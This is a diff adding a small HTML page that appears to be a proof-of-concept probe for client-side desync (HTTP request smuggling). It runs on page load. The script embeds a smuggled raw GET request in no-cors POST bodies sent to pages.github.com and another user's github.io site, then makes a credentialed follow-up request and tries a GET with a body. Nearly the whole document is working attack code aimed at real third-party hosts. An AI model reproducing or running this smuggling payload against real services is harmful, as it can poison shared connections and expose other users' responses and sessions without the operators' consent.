@@ -1,0 +1,34 @@
+<!doctype html><html><head><meta charset="utf-8"><title>CSD-TEST-IDLE</title></head><body>
+<h1>CSD test</h1><pre id="out">running...</pre>
+<script>
+const results = [];
+const log = (m)=>{results.push(m); document.title="CSD:"+m; document.getElementById('out').textContent=results.join("\n"); console.log("CSDTEST",m);};
+async function t(label, fn){ try{ await fn(); }catch(e){ log(label+" ERR "+e.message); } }
+
+async function run(){
+  const ATT = location.host;            // madaraninja1337.github.io
+  const SMUG = "GET https://"+ATT+"/testing/ HTTP/1.1\r\nHost: "+ATT+"\r\n\r\n";
+  // 1) does POST get answered at all (async)?
+  await t("post-pages.github.com", async()=>{
+     const r = await fetch("https://pages.github.com/", {method:"POST", body:SMUG, mode:"no-cors"});
+     log("post pages.github.com type="+r.type);
+  });
+  // 2) same against github.io (own site cross-origin from another host? use a sibling)
+  await t("post-github.io", async()=>{
+     const r = await fetch("https://0xd4v1.github.io/", {method:"POST", body:SMUG, mode:"no-cors"});
+     log("post 0xd4v1.github.io type="+r.type);
+  });
+  // 3) follow-up read on pages.github.com
+  await t("follow-pages", async()=>{
+     const r = await fetch("https://pages.github.com/zzfollow", {credentials:"include"});
+     log("follow pages status="+r.status);
+  });
+  // 4) GET with body (fat GET) - browsers strip bodies on GET, but try
+  await t("getbody", async()=>{
+     const r = await fetch("https://pages.github.com/", {method:"GET", body:SMUG, mode:"no-cors"});
+     log("fatget ok");
+  });
+  log("DONE");
+}
+setTimeout(run, 500);
+</script></body></html>
